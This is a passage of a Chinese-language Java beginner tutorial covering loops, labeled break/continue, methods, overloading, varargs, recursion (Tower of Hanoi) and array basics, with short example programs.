表达式){</p><p>​    //代码句子</p><p>}</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo13</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] numbers=&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;=======================================&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>break、continue、关于goto</p><ul><li>break 在任何语句的主体部分，均可以用break控制循环的流程。break 用于强行退出循环，不执行循环中剩余的语句。</li><li>coutinue语句用于循环语句体部分，用于终止某次循环，跳过循环中未执行的语句</li></ul><p><strong>goto是java的一个保留字，但是并没有在语言中正式使用，java没有goto</strong> 然而在break和continue关键字上我们可以看出一些goto的影子</p><p>“标签”是指后面跟一个冒号的标识符，例如 label：</p><p>对于java来说唯一用到标签的地方是在循环语句之前。我们希望在其中嵌套另一个循环，由于break和continue只是终止当前循环，但是若随同标签使用，它们就会中断到存在标签的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo14</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        outer:<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">101</span>;i&lt;<span class="number">150</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span> ;j&lt;i/<span class="number">2</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span> outer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个小练习打印一个三角形</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo15</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">5</span>;j&gt;i;j--)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="方法的定义和调用"><a href="#方法的定义和调用" class="headerlink" title="方法的定义和调用"></a>方法的定义和调用</h3><p>java方法是语句的集合，它们在一起执行一个功能</p><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类和对象中</li><li>方法在程序中被创建，在其他地方被引用</li></ul><p><strong>方法的原子性：一个方法只完成一个功能，这样有利于我们的拓展</strong></p><p>方法的命名规则，首单词首字母小写后面遵循驼峰原则</p><p>方法包含一个方法头和一个方法体</p><ul><li>修饰符：修饰符，可选，定义了方法的访问类型</li><li>返回值类型： 方法可能会有返回值，returnValueType ，但是有些方法没有返回值，此时returnValueType为void</li><li>方法名：方法的实际名称，方法名和参数表共同构成方法签名</li><li>参数类型：参数像一个占位符，当方法被调用时，传递给参数<ul><li>形式参数：在方法被调用时用于接受外界输入的数据</li><li>实参：调用方法时实际传给方法的数据</li></ul></li><li>方法体：方法体包含具体的语句，定义了该方法的功能</li></ul><blockquote><p>修饰符 返回值类型 方法名(参数类型 参数名){</p><p>方法体</p><p>…</p><p>return 返回值；</p><p>}</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum =add(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.print(sum);</span><br><span class="line">        Demo01 demo01= <span class="keyword">new</span> Demo01();</span><br><span class="line">        demo01.test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a ,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">15</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h3><p>重载就是在一个类中，有相同的函数名称，但是形参不同的函数</p><p>方法的重载规则：</p><ul><li>方法名必须相同</li><li>参数列表必须不同（个数不同、类型不同、参数排列顺序不同）</li><li>返回值的类型可以相同也可以不同</li><li>仅仅返回值的类型不同不足以成为方法的重载</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> max = max(<span class="number">10</span>,<span class="number">20.0</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> num1, <span class="keyword">double</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1==num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result = num1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result= num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1==num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result = num1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result= num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h3><p>可以通过命令行参数传递给main()函数实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;args.length ; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;args[&quot;</span>+i+<span class="string">&quot;]:&quot;</span>+args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210409165046653.png" class="lazyload" data-srcset="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210409165046653.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210409165046653"></p><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>JDK 1.5开始，java开始支持传递同类型的可变参数给一个方法</p><p>在方法声明中，在指定参数类型后面加一个省略号(…)</p><p><strong>一个方法只能指定一个可变参数，它必须是方法的最后一个参数，任何普通的参数必须在它之前声明</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo04</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo04 demo04 =<span class="keyword">new</span> Demo04();</span><br><span class="line">        demo04.printMax(<span class="number">12</span>,<span class="number">122</span>,<span class="number">43334</span>,<span class="number">23423.446</span>,<span class="number">5463.346</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMax</span><span class="params">(<span class="keyword">double</span> ... numbers)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numbers.length==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没有什么东西可比较呢&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> result = numbers[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;numbers.length ; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(numbers[i]&gt;result)&#123;</span><br><span class="line">                result = numbers[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>递归就是：A方法调用A方法！就是自己调用自己</p><p>递归包含两部分：</p><ul><li>递归头：什么时候不调用自身方法。如果没有头，将会陷入死循环</li><li>递归体：什么时候需要调用自身方法</li></ul><p>我们来解决一个10阶的汉诺塔问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo06</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>  <span class="keyword">int</span> c =<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo06 demo06 =<span class="keyword">new</span> Demo06();</span><br><span class="line">        demo06.hanNo(<span class="number">10</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line">        System.out.println((c++)+<span class="string">&quot;步\t第&quot;</span>+n+<span class="string">&quot;块从&quot;</span>+a+<span class="string">&quot;移动到&quot;</span>+b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hanNo</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> x,<span class="keyword">char</span> y,<span class="keyword">char</span> z)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            move(<span class="number">1</span>,x,z);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            hanNo(n-<span class="number">1</span>,x,z,y);</span><br><span class="line">            move(n,x,z);</span><br><span class="line">            hanNo(n-<span class="number">1</span>,y,x,z);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><strong>数组时相同类型数据的有序集合</strong></p><h3 id="数组的声明创建以及初始化"><a href="#数组的声明创建以及初始化" class="headerlink" title="数组的声明创建以及初始化"></a>数组的声明创建以及初始化</h3><p>必须先声明数组变量，才能在程序中使用数组。</p><blockquote><p>dataType[]  arrayRefVar;</p></blockquote><p>Java使用 new操作符来创建数组</p><blockquote><p>dataType[]  arrayRefVar = new dataType[arraySize];</p></blockquote><p>数组的元素是通过索引访问的，数组索引从 0 开始</p><p>获取数组长度 <code>arrays.length</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums; <span class="comment">//建议使用上面的方式</span></span><br><span class="line">        <span class="comment">//int nums2[]; //下面这种只是早年为了让c和c++程序员适应java来设计的</span></span><br><span class="line">        nums = <span class="keyword">new</span>  <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        nums[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        nums[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="java内存初步"><a href="#java内存初步" class="headerlink" title="java内存初步"></a>java内存初步</h4><p><img src="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210410211257833.png" class="lazyload" data-srcset="/2021/04/06/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-%E4%BA%8C/image-20210410211257833.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210410211257833"></p><h4 id="三种初始化"><a href="#三种初始化" class="headerlink" title="三种初始化"></a>三种初始化</h4><ul><li><p>静态初始化 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">Man[] mans = &#123;<span class="keyword">new</span> Man(<span class="number">1</span>,<span class="number">1</span>),<span class="keyword">new</span> Man(<span class="number">1</span>,<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure><p>根据赋值的量的长度来决定初始化数组的长度</p></li><li><p>动态初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> [] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>先根据预定大小初始化数组长度，再赋值</p></li><li><p>默认初始化</p><p>数组时引用类型，他的元素相当于实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方式被隐式初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        System.out.println(a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        b[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(b[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(b[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数组的四个基本特点"><a href="#数组的四个基本特点" class="headerlink" title="数组的四个基本特点"></a>数组的四个基本特点</h4><blockquote><p>长度确定，数组一旦被创建，<strong>他的大小就是不可改变的</strong></p><p><strong>其元素必须是相同类型</strong>，不允许混合类型</p><p>数组的元素可以是任何数据类型，包括基本类型和引用类型</p><p>数组本身就是对象，数组的每一个元素相当于该对象的成员变量，<strong>Java中对象存在堆中，所以数组对象也存在堆中</strong></p></blockquote><h4 id="数组边界，以及越界报错"><a href="#数组边界，以及越界报错" class="headerlink" title="数组边界，以及越界报错"></a>数组边界，以及越界报错</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> [] a =<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    System.out.println(a[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java.lang.ArrayIndexOutOfBoundsException: Index 2 out of bounds for length 2</p><p><strong>ArrayIndexOutOfBoundsException</strong>:数组下标越界异常！</p><h3 id="数组的使用"><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h3><h4 id="For-Each循环"><a href="#For-Each循环" class="headerlink" title="For-Each循环"></a>For-Each循环</h4><p>写增强型for循环吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arrays = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> array:arrays)&#123;</span><br><span class="line">            System.out.println(array);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> sum= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> array:arrays)&#123;</span><br><span class="line">            sum+=array;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> array:arrays)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array&gt;max)&#123;</span><br><span class="line">                max=array;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max=&quot;</span>+max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数组作为方法入参或者作为返回值"><a href="#数组作为方法入参或者作为返回值" class="headerlink" title="数组作为方法入参或者作为返回值"></a>数组作为方法入参或者作为返回值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 